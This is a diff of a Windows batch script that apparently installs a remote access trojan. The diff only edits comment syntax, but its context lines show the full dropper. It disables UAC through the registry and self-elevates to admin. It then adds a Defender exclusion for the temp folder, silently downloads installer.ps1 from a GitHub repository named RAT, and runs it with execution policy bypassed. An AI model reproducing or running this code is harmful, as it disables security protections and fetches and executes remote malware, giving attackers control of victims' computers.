@@ -1,18 +1,18 @@
-REM get admin permissions for script
+@REM get admin permissions for script
 @echo off
 
 powershell Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name EnableLUA -Value 0
 
 :: BatchGotAdmin
 :-------------------------------------
-REM  --> check for permissions
+@REM  --> check for permissions
     IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
 >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
 ) ELSE (
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
 )
 
-REM --> if error flag set, we do not have admin.
+@REM --> if error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
@@ -31,9 +31,9 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 
-REM disable defender
+@REM disable defender
 
-REM rat resources
+@REM rat resources
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/installer.ps1 -OutFile installer.ps1"; Add-MpPreference -ExclusionPath "$env:temp"
 powershell powershell.exe -ep bypass ./installer.ps1
 
